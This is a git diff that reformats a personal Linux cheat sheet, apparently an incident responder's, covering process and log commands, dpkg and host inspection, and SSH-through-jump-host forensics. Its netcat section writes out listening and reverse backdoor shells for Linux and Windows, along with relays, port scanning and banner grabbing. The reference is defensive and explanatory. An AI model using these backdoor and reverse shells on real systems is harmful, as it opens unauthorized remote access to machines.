@@ -80,6 +80,11 @@ Kill multi processes at once
 pgrep <processName> | xargs kill
 ```
 
+PKill
+```
+pkill
+```
+
 Kill multi processes at once by name
 ```
 killall -9 <mattermost-desktop>
@@ -539,14 +544,14 @@ lastb -f /var/log/btmp | less
 Info: SSH auth failures are logged here /var/log/auth.log
 Link: https://serverfault.com/questions/130482/how-to-check-sshd-log
 ```
-Command: grep 'sshd' /var/log/auth.log
-Command: tail -n 500 /var/log/auth.log | grep 'sshd'   (last 500 logs)
-Command: tail -f -n 500 /var/log/auth.log | grep 'sshd'   (live view)
+grep 'sshd' /var/log/auth.log
+tail -n 500 /var/log/auth.log | grep 'sshd'   (last 500 logs)
+tail -f -n 500 /var/log/auth.log | grep 'sshd'   (live view)
  ```
 
 Info: Find users that have been added to they system 
 ```
- ausearch -if /path/to/evidence/var/log/audit.log -c useradd
+ausearch -if /path/to/evidence/var/log/audit.log -c useradd
 ```
    
 Info: Split large CSV file into many with 999 rows, and keep the headers. 
@@ -618,13 +623,20 @@ cat /etc/fstab
 flatpack list
 #users 
 cat /etc/passwd
+
 # Show host information  
-cat /etc/hosts 
-lsblk
-sudo dd bs=4m if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
+```
+cat /etc/hosts
+```
+
+# Imaging 
+```
+sudo dd if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
+```
+
 ls -AlF /var/lib/dpkg/info/
 ll /var/lib/dpkg/info/ | grep -i '.list'
-pkill
+
 dpkg --get-selections 
 grep install /var/log/dpkg.log /var/log/dpkg.log.1
 pgrep
@@ -632,79 +644,50 @@ ip route show
   313  ip route get ipaddress
   314  ip route show
 
-file 
 iftop
-htop
-wget
-curl 
-strings 
+
 update-manager -d
 
 
-   ===============
-   NetCat Commands
-   ===============
-#Netcat Command Flags
-=====================   
-$ nc [options] [TargetIPaddr] [port(s)]
-The [TargetIPaddr] is simply the other side’s IP
-address or domain name. It is required in client mode
-of course (because we have to tell the client where to
-connect), and is optional in listen mode.
--l: Listen mode (default is client mode)
--L: Listen harder (supported only on Windows
-version of Netcat). This option makes Netcat a
-persistent listener which starts listening again
-after a client disconnects
--u: UDP mode (default is TCP)
--p: Local port (In listen mode, this is port listened
-on. In client mode, this is source port for all
-packets sent)
--e: Program to execute after connection occurs,
-connecting STDIN and STDOUT to the
-program
--n: Don’t perform DNS lookups on names of
-machines on the other side
--z: Zero-I/O mode (Don’t send any data, just emit
-a packet without payload)
--wN: Timeout for connects, waits for N seconds
-after closure of STDIN. A Netcat client or
-listener with this option will wait for N seconds
-to make a connection. If the connection
-doesn’t happen in that time, Netcat stops
-running.
--v: Be verbose, printing out messages on
-Standard Error, such as when a connection
-occurs
--vv: Be very verbose, printing even more details
-on Standard Error
-
-#basics
-======-
+# NetCat Commands
 Fundamental Netcat Client:
-   $ nc [TargetIPaddr] [port]   
+```
+$ nc [TargetIPaddr] [port]
+```
 Fundamental Netcat Listener:
-   $ nc –l -p [LocalPort]
+```
+$ nc –l -p [LocalPort]
+```
 Both the client and listener take input from STDIN
 and send data received from the network to STDOUT
 
-#File transfer using NetCat
-===========================
+# File transfer using NetCat
+
 Push a file from client to listener:
-   $ nc –l -p [LocalPort] > [outfile]
+```
+$ nc –l -p [LocalPort] > [outfile]
+```
 Listen on [LocalPort],  results in [outfile]
-   $ nc –w3 [TargetIPaddr] [port] <[infile]
+```
+$ nc –w3 [TargetIPaddr] [port] <[infile]
+```
 Push [infile] to [TargetIPaddr] on [port]
 Pull file from listener back to client:
-   $ nc –l -p [LocalPort] < [infile]
+```
+$ nc –l -p [LocalPort] < [infile]
+```
 Listen on [LocalPort], prep to push [infile]
-   $ nc –w3 [TargetIPaddr] [port] > [outfile]
+```
+$ nc –w3 [TargetIPaddr] [port] > [outfile]
+```
 Connect to [TargetIPaddr] on [port] and retrieve [outfile]
 
-# TCP Port Scanner
+# NetCat TCP Port Scanner
 ==================
 Port scan an IP Address:
+```
 $ nc –v –n –z –w1 [TargetIPaddr]
+```
 [start_port]-[end_port]
 Attempt to connect to each port in a range from
 [end_port] to [start_port] on IP Address
@@ -719,7 +702,9 @@ choose port numbers randomly in the range
 ==================-
 Grab the banner of any TCP service running on an IP
 Address from Linux:
+```
 $ echo "" | nc –v –n –w1 [TargetIPaddr]
+```
 [start_port]-[end_port]
 Attempt to connect to each port in a range from
 [end_port] to [start_port] on IP Address
@@ -732,17 +717,26 @@ Add –r to randomize destination ports within the
 range
 Add –p [port] to specify a source port for the
 
-#Backdoor Shells
+# NetCat Backdoor Shells
 ===============-
 Listening backdoor shell on Linux:
-   $ nc –l –p [LocalPort] –e /bin/bash
+```
+$ nc –l –p [LocalPort] –e /bin/bash
+```
 Listening backdoor shell on Windows:
-   C:\> nc –l –p [LocalPort] –e cmd.exe
+```   
+C:\> nc –l –p [LocalPort] –e cmd.exe
+```
+
 Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
-Reverse backdoor shell on Linux:
-   $ nc [YourIPaddr] [port] –e /bin/bash
+# NetCt Reverse backdoor shell on Linux:
+```
+$ nc [YourIPaddr] [port] –e /bin/bash
+```
 Reverse backdoor shell on Windows:
-   C:\> nc [YourIPaddr] [port] –e cmd.exe
+```
+C:\> nc [YourIPaddr] [port] –e cmd.exe
+```
 Create a reverse shell that will attempt to connect to
 [YourIPaddr] on local port [port]. This shell
 can then be captured using a fundamental nc listener
@@ -750,55 +744,52 @@ can then be captured using a fundamental nc listener
 #Netcat Relays on Linux
 =====================--
 To start, create a FIFO (named pipe) called backpipe:
+```
    $ cd /tmp
    $ mknod backpipe p
+```
 Listener-to-Client Relay:
+```
    $ nc –l –p [LocalPort] 0<backpipe | nc [TargetIPaddr] [port] | tee backpipe
+```
 Create a relay that sends packets from the local port [LocalPort] to a Netcat client connected to [TargetIPaddr] on port [port]
 Listener-to-Listener Relay:
+```
    $ nc –l –p [LocalPort_1] 0<backpipe | nc –l –p [LocalPort_2] | tee backpipe
+```
 Create a relay that sends packets from anyconnection on [LocalPort_1] to any connection on [LocalPort_2]
 
 Client-to-Client Relay:
+```
    $ nc [PreviousHopIPaddr] [port] 0<backpipe | nc [NextHopIPaddr] [port2] | tee backpipe
+```
 
 Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]
 
 
-   ======--
-   TCP Dump 
-   ======--
+# TCP Dump 
    
-   =========
-   SNORT IDS
-   =========
+# SNORT IDS
 
-   ===
-   BRO 
-   ===
+# BRO 
 
 
-   ================
-   List our Drivers 
-   ================
-   
-
-
-1515  sudo vmware-installer -u vmware-player
-sudo sh ./VMware-Horizon-Client-x.x.x-yyyyyyy.arch.bundle
 
 List Symbolic LInks in a dir 
-   find . -maxdepth 1 -type l -ls
+```
+find . -maxdepth 1 -type l -ls
+```
 
 
 # Remnux - VMWare make share folder available (run on guest)
 ### https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
+```
    sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
+```
 
 
 
-# Commands through a Jump host
-
+# Run Commands through a Jump host
 
 -- DNS LOGS -- 
 ```
@@ -836,7 +827,6 @@ ssh pivotgw ssh {serverip}  cat /etc/passwd | grep -v "nologin" | grep -v "false
 ssh pivotgw ssh {serverip} w
 ```
 
-
 -- MOST RECENT LOGINS -- 
 ```
 ssh pivotgw ssh {serverip} last
@@ -853,11 +843,13 @@ init: ssh pivotgw ssh {serverip} sudo ls -la /etc/init
 ```
 
 -- AUTH LOGS -- 
+```
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5 | sort | uniq -c | sort -nr
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f7 | sort | uniq -c | sort -nr
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5,7 | sort | uniq -c | sort -nr
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -E 'sshd.*Failed|Invalid|failure'
+```
 
 -- List the top 25 largest files on the server -- 
 ```
@@ -867,13 +859,15 @@ ssh pivotgw ssh {serverip} sudo find /home -printf '%s\\\ %p\\\\n'| sort -nr | h
 -- rsync files from server to local host: 
 
 -On the server:
+```
 sudo su
 cp /file/location/filename /home/{yourUsername}/
 cd /home/{yourUserName}
 chown {yourUsername} {filename}
+```
 If dealing with multiple files or a directory, zip the contents of the directory first. Then rsync it to your system. 
 
--On Analyst Workstation: 
+-On Client (workstation) : 
 ```
 rsync -v -r -e "ssh pivotgw ssh" {serverip}:/home/{yourUserName}/{FileName} ~/temp/IR
 ```
